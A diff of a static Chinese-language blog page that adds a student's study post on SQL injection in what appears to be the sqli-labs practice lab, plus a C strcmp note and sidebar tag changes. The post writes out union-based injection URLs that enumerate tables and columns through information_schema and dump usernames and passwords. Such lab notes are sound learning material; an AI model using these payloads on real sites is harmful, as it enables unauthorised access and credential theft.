@@ -64,6 +64,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-blog c" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/14/blog%20c/" class="article-date">
+  <time datetime="2020-11-14T13:07:05.000Z" itemprop="datePublished">2020-11-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/14/blog%20c/">MYSQL</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前言：这是第二次写lesson1的blog，万事开头难。</p>
+<p>一.寻找sql注入点</p>
+<p>根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。</p>
+<p>注：1.（自己的摸索）：发现输入id=非正整数如（?id=-1）时，页面返回为空。这是因为这些数值不在数据库范围之内，故返回为空。</p>
+<p>2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or 1=1–+语句返回值正常，反之报错。</p>
+<p>二.查询字段数</p>
+<p>利用order by语句。?id=1%27%20order%20by%20<em>n</em>–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：</p>
+<p>输入?id=1%27%20order%20by%201–+，返回正常。</p>
+<p>输入?id=1%27%20order%20by%204–+，返回异常。</p>
+<p>当输入到第n-1个正常，第n个不正常时，说明拥有n-1个字段数。</p>
+<p>注：字段数就是sql数据库中存在变量数的个数。</p>
+<p>三.union select看返回值</p>
+<p>1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。</p>
+<p>只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。</p>
+<p>2.利用union select语句查看数据库返回值。</p>
+<p>输入?id=-1%27union%20select%201,database(),2–+.</p>
+<p>由此可知：database的名称为security。</p>
+<p>注意使用union select</p>
+<p>四.查表</p>
+<p>1.输入?id=-1’ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=‘sercurity’–+即可查获在sercurity数据库中的表单名。</p>
+<p>注：对于理解该代码：group_concat(table_name) ：group_concat函数是典型的字符串连接函数；from information_schema.tables：来自信息图表数据库中的表单。where table_schema=‘sercurity’其中where为限制词，where table_schema=‘sercurity’:寻找范围在数据库名为sercurity中。</p>
+<p>pr:为了方便在页面上看到自己在url里输入的内容可以在index文件里加一句echo “ $sql&lt; br &gt;”;</p>
+<p>五.查字段名以及字段数值</p>
+<p>1.输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+可查得字段名。</p>
+<p>2.输入?id=-1’union select 1,2,group_concat(username,0x3a,password) from users–+可查得每个用户对应的密码（0x3a是字符冒号‘  ：’对应16进制的ASCLL码）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/14/blog%20c/" data-id="cki2vx5xj00037wvu16ia5o0j" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86lesson1/" rel="tag">sql注入基本知识lesson1</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-blog b" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/10/blog%20b/" class="article-date">
@@ -391,6 +454,9 @@
 <li>按顺序赋值并且省略第一维的长度时，数组第一维的大小按以下规则决定。设有n个初值数据，第二维长度为m，由于可能只对部分数据赋值，n/m不一定会被整除，因此第一维的大小通常为(int)(n/m+1).</li>
 <li>矩阵转置：将一个二维数组的行和列元素进行互换。即将二维数组a中的第i行第j列元素赋给二位数组b中的第j行第i列。</li>
 </ol>
+<p>三.字符串函数</p>
+<p>strcmp(字符串1,字符串2)</p>
+<p>用法：两个字符串自左向右一个个比对，直到出现不同的字符或遇到‘\0’为止。（若字符串第一个字符比对就不同，那么即停止比对）。函数的返回值——a.若字符串1=字符串2，那么返回值为0；b.若字符串1&gt;字符串2，那么返回值为正整数；c.若字符串1&lt;字符串2，那么返回值为负整数。</p>
 
       
     </div>
@@ -548,7 +614,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lesson5-lesson6/" rel="tag">lesson5&lesson6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lesson7/" rel="tag">lesson7</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%8B%93%E5%B1%95%E7%AF%87%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql拓展篇：数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" rel="tag">sql注入基本知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86lesson1/" rel="tag">sql注入基本知识lesson1</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0/" rel="tag">函数</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E9%92%88/" rel="tag">指针</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%B1%87%E6%80%BB/" rel="tag">第三章汇总</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%94%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" rel="tag">第五章汇总（1）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" rel="tag">第四章汇总（1）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%882%EF%BC%89/" rel="tag">第四章汇总（2）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%883%EF%BC%89/" rel="tag">第四章汇总（3）</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%89/" rel="tag">C语言学习（解题思路）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lesson5-lesson6/" rel="tag">lesson5&lesson6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lesson7/" rel="tag">lesson7</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%8B%93%E5%B1%95%E7%AF%87%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql拓展篇：数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" rel="tag">sql注入基本知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86lesson1/" rel="tag">sql注入基本知识lesson1</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0/" rel="tag">函数</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%87%E9%92%88/" rel="tag">指针</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%B1%87%E6%80%BB/" rel="tag">第三章汇总</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E4%BA%94%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" rel="tag">第五章汇总（1）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" rel="tag">第四章汇总（1）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%882%EF%BC%89/" rel="tag">第四章汇总（2）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%883%EF%BC%89/" rel="tag">第四章汇总（3）</a></li></ul>
     </div>
   </div>
 
@@ -558,7 +624,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">C语言学习</a> <a href="/tags/lesson5-lesson6/" style="font-size: 10px;">lesson5&lesson6</a> <a href="/tags/lesson7/" style="font-size: 10px;">lesson7</a> <a href="/tags/mysql/" style="font-size: 20px;">mysql</a> <a href="/tags/mysql%E6%8B%93%E5%B1%95%E7%AF%87%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql拓展篇：数据库的使用</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 10px;">sql注入基本知识</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86lesson1/" style="font-size: 10px;">sql注入基本知识lesson1</a> <a href="/tags/%E5%87%BD%E6%95%B0/" style="font-size: 10px;">函数</a> <a href="/tags/%E6%8C%87%E9%92%88/" style="font-size: 10px;">指针</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%B1%87%E6%80%BB/" style="font-size: 10px;">第三章汇总</a> <a href="/tags/%E7%AC%AC%E4%BA%94%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" style="font-size: 10px;">第五章汇总（1）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" style="font-size: 10px;">第四章汇总（1）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%882%EF%BC%89/" style="font-size: 10px;">第四章汇总（2）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%883%EF%BC%89/" style="font-size: 10px;">第四章汇总（3）</a>
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">C语言学习</a> <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%89/" style="font-size: 10px;">C语言学习（解题思路）</a> <a href="/tags/lesson5-lesson6/" style="font-size: 10px;">lesson5&lesson6</a> <a href="/tags/lesson7/" style="font-size: 10px;">lesson7</a> <a href="/tags/mysql/" style="font-size: 20px;">mysql</a> <a href="/tags/mysql%E6%8B%93%E5%B1%95%E7%AF%87%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql拓展篇：数据库的使用</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 10px;">sql注入基本知识</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86lesson1/" style="font-size: 10px;">sql注入基本知识lesson1</a> <a href="/tags/%E5%87%BD%E6%95%B0/" style="font-size: 10px;">函数</a> <a href="/tags/%E6%8C%87%E9%92%88/" style="font-size: 10px;">指针</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a> <a href="/tags/%E7%AC%AC%E4%B8%89%E7%AB%A0%E6%B1%87%E6%80%BB/" style="font-size: 10px;">第三章汇总</a> <a href="/tags/%E7%AC%AC%E4%BA%94%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" style="font-size: 10px;">第五章汇总（1）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%881%EF%BC%89/" style="font-size: 10px;">第四章汇总（1）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%882%EF%BC%89/" style="font-size: 10px;">第四章汇总（2）</a> <a href="/tags/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%B1%87%E6%80%BB%EF%BC%883%EF%BC%89/" style="font-size: 10px;">第四章汇总（3）</a>
     </div>
   </div>
 
@@ -580,6 +646,10 @@
       <ul>
         
           <li>
+            <a href="/2020/12/24/blog10/">blog10</a>
+          </li>
+        
+          <li>
             <a href="/2020/12/13/blog%20j/">lesson9、lesson10</a>
           </li>
         
@@ -593,10 +663,6 @@
         
           <li>
             <a href="/2020/12/01/blog9/">C语言学习第六章</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/29/blog%20g/">MYSQL</a>
           </li>
         
       </ul>
